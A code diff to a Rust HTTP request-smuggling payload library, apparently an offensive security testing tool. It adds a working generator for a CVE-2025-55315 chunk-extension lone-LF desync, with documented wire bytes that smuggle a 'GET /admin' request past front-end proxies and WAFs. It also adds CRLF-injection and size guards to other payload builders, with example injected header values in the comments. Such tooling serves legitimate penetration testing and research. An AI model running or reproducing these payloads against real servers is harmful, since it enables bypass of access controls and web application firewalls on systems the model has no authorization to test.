@@ -24,6 +24,17 @@ pub enum SmugglingVariant {
     MultiValueCl,
     ClObfuscation,
     ChunkExtension,
+    /// CVE-2025-55315 — chunk-extension with a lone LF embedded inside
+    /// the extension field. Proxies that treat bare `\n` as a line
+    /// terminator (Akamai, F5, some IIS configurations) split the
+    /// stream at the LF; Kestrel and .NET-class back-ends search only
+    /// for `\r` when parsing extensions, so the same bytes look like
+    /// extension continuation. The bytes between the LF and the
+    /// `0\r\n\r\n` chunk terminator become a smuggled request that
+    /// reaches the origin invisible to the WAF (which doesn't inspect
+    /// chunk extensions). CVSS 9.9; Praetorian disclosure Oct 2025.
+    /// R69 pass-21 — frontier technique per the 2025 research scan.
+    ChunkExtensionLoneLf,
     Http10,
     Http09,
     Pipeline,
@@ -376,6 +387,86 @@ pub fn chunk_extension(
     })
 }
 
+/// CVE-2025-55315 — chunk-extension TERM.EXT desync via lone LF.
+///
+/// The smuggled request rides inside what looks (to one parser) like
+/// the chunk-extension token, separated from the chunk-size with a
+/// bare `\n` instead of the spec-required `\r\n`. Front-end proxies
+/// that accept bare LF as a line terminator (Akamai's edge layer is
+/// confirmed; F5 BIG-IP and several IIS configs reproduce it) split
+/// the stream at the LF and forward everything before as one request
+/// and everything after as the next. Kestrel and other .NET-class
+/// back-ends scan for `\r` ONLY when parsing chunk extensions, so the
+/// same bytes look like a single chunk-extension parameter. WAFs
+/// rarely inspect chunk-extension values — the smuggled bytes are
+/// invisible to them.
+///
+/// Wire shape (lone-LF marked `\n` explicitly):
+///
+/// ```text
+/// POST / HTTP/1.1
+/// Host: target
+/// Transfer-Encoding: chunked
+///
+/// 5;ext=val\n
+/// GET /admin HTTP/1.1
+/// Host: target
+///
+/// 0
+///
+/// ```
+///
+/// `smuggled_prefix` becomes the inner request line + headers. The
+/// `5` is the size of the first dummy chunk's payload (5 bytes of
+/// `XXXXX`) which keeps the framing valid even for the parser that
+/// processed the extension correctly.
+///
+/// Pass 21 R69 — CVE-2025-55315 frontier technique.
+pub fn chunk_extension_lone_lf(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+    let host = validate_host(host)?;
+    let prefix = validate_prefix(smuggled_prefix)?;
+    // The smuggled request must terminate cleanly so the back-end
+    // sees a well-formed pipelined request after the desync.
+    let prefix = ensure_double_crlf(&prefix);
+    // The body is one 5-byte dummy chunk whose extension field
+    // contains a lone LF followed by the smuggled request. After
+    // the dummy chunk's data, the closing `0\r\n\r\n` terminates
+    // the outer chunked encoding.
+    //
+    // Wire bytes (using `\n` for lone-LF and `\r\n` for CRLF):
+    //   `5;evilext=\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\nXXXXX\r\n0\r\n\r\n`
+    //
+    // Front-end (LF-tolerant): sees `5;evilext=` as the size+extension,
+    // then `\n` as a line terminator, then `GET /admin...` as a NEW
+    // request. The LF-tolerant parser pipelines that as a second
+    // request. The `XXXXX\r\n0\r\n\r\n` is leftover bytes the LF
+    // parser drops or appends to the second request.
+    //
+    // Back-end (CR-only, Kestrel-class): scans for `\r` in the
+    // extension. Sees `5;evilext=\nGET /admin HTTP/1.1...Host: target\r`
+    // (the trailing `\r` from the smuggled request's CRLF) as the
+    // ENTIRE extension value, then reads exactly 5 bytes (`XXXXX`)
+    // as the chunk data, then `0\r\n\r\n` as terminator. One request,
+    // smuggled-request bytes hidden inside extension noise.
+    let body = format!("5;evilext=\n{prefix}XXXXX\r\n0\r\n\r\n");
+    let raw = format!(
+        "POST / HTTP/1.1\r\n\
+         Host: {host}\r\n\
+         Transfer-Encoding: chunked\r\n\
+         \r\n\
+         {body}"
+    );
+    Ok(SmugglingPayload {
+        description: "Chunk-extension with lone-LF desync (CVE-2025-55315)".into(),
+        variant: SmugglingVariant::ChunkExtensionLoneLf,
+        raw_bytes: raw.into_bytes(),
+        canary: Canary::generate(),
+    })
+}
+
 /// Chunk-size formatting mutations.
 pub fn chunk_size_mutations(
     host: &str,
@@ -612,6 +703,14 @@ pub fn h2c_smuggle(
 ) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
+    // Guard the caller-supplied settings value — it is interpolated
+    // verbatim into `HTTP2-Settings: {settings}\r\n`. A CRLF-embedded
+    // value (e.g. `"AAAA\r\nEvil: hdr"`) would inject a raw header.
+    // The default constant is safe; only caller-supplied values need
+    // the check (we guard unconditionally for future default changes).
+    if http2_settings.is_some() {
+        crate::safety::guard_no_crlf(settings)?;
+    }
     let raw = format!(
         "GET / HTTP/1.1\r\n\
          Host: {host}\r\n\
@@ -683,6 +782,11 @@ pub fn h2c_post_smuggle(
 ) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
+    // Same guard as h2c_smuggle — settings is interpolated verbatim
+    // into `HTTP2-Settings: {settings}\r\n`.
+    if http2_settings.is_some() {
+        crate::safety::guard_no_crlf(settings)?;
+    }
     let content_length = body.len();
     let mut raw = format!(
         "POST / HTTP/1.1\r\n\
@@ -775,8 +879,8 @@ pub fn websocket_smuggle_custom(
     }
     let key = key.map_or_else(
         || {
-            // Derive a deterministic nonce from FNV-1a of (host, path).
-            let nonce = fnv1a_ws_nonce(host.as_str(), path.as_str());
+            let mut nonce = [0u8; 16];
+            rand::Rng::fill(&mut rand::thread_rng(), &mut nonce);
             base64::Engine::encode(&base64::engine::general_purpose::STANDARD, nonce)
         },
         std::string::ToString::to_string,
@@ -927,8 +1031,21 @@ pub fn zero_cl_desync(
 ///  <masked_name>: <value>\r\n
 /// \r\n
 /// ```
-pub fn vh_masked_header(masked_name: &str, value: &str) -> Vec<SmugglingPayload> {
-    crate::safety::guard_no_crlf(masked_name).ok();
+///
+/// # Errors
+///
+/// Returns [`crate::safety::SafetyError::HeaderInjection`] if either
+/// `masked_name` or `value` contains `\r`, `\n`, or `\0`. The previous
+/// implementation called `guard_no_crlf(masked_name).ok()`, silently
+/// discarding the error and allowing the raw control bytes to pass through
+/// into the wire payload undetected (§15 AUDIT HUNTS: CRLF / control-byte
+/// injection).
+pub fn vh_masked_header(
+    masked_name: &str,
+    value: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+    crate::safety::guard_no_crlf(masked_name)?;
+    crate::safety::guard_no_crlf(value)?;
     // Variant 1: space-prefix on the header name.
     // NOTE: Rust backslash-continuation strips leading whitespace, so we
     // concatenate the SP-prefixed line explicitly to preserve the leading space.
@@ -948,7 +1065,7 @@ pub fn vh_masked_header(masked_name: &str, value: &str) -> Vec<SmugglingPayload>
          {xname}: {value}\r\n\
          \r\n"
     );
-    vec![
+    Ok(vec![
         SmugglingPayload {
             description: format!("V-H masked space-prefix: {masked_name}"),
             variant: SmugglingVariant::KettleDesync,
@@ -961,7 +1078,7 @@ pub fn vh_masked_header(masked_name: &str, value: &str) -> Vec<SmugglingPayload>
             raw_bytes: xname_raw.into_bytes(),
             canary: Canary::generate(),
         },
-    ]
+    ])
 }
 
 /// **Expect: 100-continue 0.CL abuse** (Kettle BH25 §5.1).
@@ -1165,9 +1282,21 @@ pub fn double_desync(
 /// Returns a candidate set of probes, one per delimiter character, with the
 /// delimiter inserted at position 3 in the host value to produce a variety of
 /// split positions.
-pub fn malformed_host_split(host_value: &str) -> Vec<SmugglingPayload> {
+///
+/// # Errors
+/// Returns [`SafetyError::HeaderInjection`] if `host_value` contains `\r`,
+/// `\n`, or `\0`.  These control bytes would be interpolated directly into the
+/// `Host: {mangled}\r\n` wire line, allowing a hostile caller to inject
+/// arbitrary headers into the raw request bytes.
+pub fn malformed_host_split(
+    host_value: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+    // Guard first — host_value is interpolated verbatim into
+    // `Host: {mangled}\r\n`. A caller passing `"abc\r\nX-Evil: yes"` would
+    // inject a raw header into each of the 8 probe payloads.
+    crate::safety::guard_no_crlf(host_value)?;
     let delimiters = [':', '/', '\\', '?', '#', '@', '[', ']'];
-    delimiters
+    Ok(delimiters
         .iter()
         .map(|&delim| {
             // Insert delimiter after first 3 Unicode scalar values (or at end if
@@ -1196,7 +1325,7 @@ pub fn malformed_host_split(host_value: &str) -> Vec<SmugglingPayload> {
                 canary: Canary::generate(),
             }
         })
-        .collect()
+        .collect())
 }
 
 /// **Browser-powered H2→H1 downgrade with conflicting Content-Length**
@@ -1294,8 +1423,18 @@ pub fn line_folded_header(header: &str, value: &str, fold_text: &str) -> Vec<u8>
 /// Each `SmugglingPayload` uses the chunk line to wrap a single-byte chunk
 /// (`X`) so the body is deterministic regardless of `body` length.  The full
 /// `body` is appended after the `0\r\n\r\n` terminator as the smuggled prefix.
-pub fn chunk_extension_variants(body: &str) -> Vec<SmugglingPayload> {
-    // Sanitise smuggled body — length-only guard (no CRLF strip, body may have them).
+///
+/// # Errors
+/// Returns [`SafetyError::PrefixTooLong`] if `body` exceeds 64 KiB.
+/// Without this guard each call allocates `8 × body.len()` bytes (one clone
+/// per variant), so a 500 MiB hostile body would exhaust ~4 GiB of RAM.
+pub fn chunk_extension_variants(
+    body: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+    // OOM guard: 8 payloads × body — without this a 500 MiB body = ~4 GiB.
+    // The comment in the previous version said "length-only guard" but no
+    // guard was ever implemented. Fixed here.
+    crate::safety::guard_prefix_len(body, 64 * 1024)?;
     let smuggled = body.to_owned();
     let chunk_byte = "X";
     let chunk_size = chunk_byte.len(); // 1
@@ -1310,7 +1449,7 @@ pub fn chunk_extension_variants(body: &str) -> Vec<SmugglingPayload> {
         ("digit-start ext name",  ";0x=y"),
         ("NUL in extension",      ";\x00ext=v"),
     ];
-    extensions
+    Ok(extensions
         .iter()
         .map(|(desc, ext)| {
             let body_section = format!(
@@ -1330,7 +1469,7 @@ pub fn chunk_extension_variants(body: &str) -> Vec<SmugglingPayload> {
                 canary: Canary::generate(),
             }
         })
-        .collect()
+        .collect())
 }
 
 #[cfg(test)]
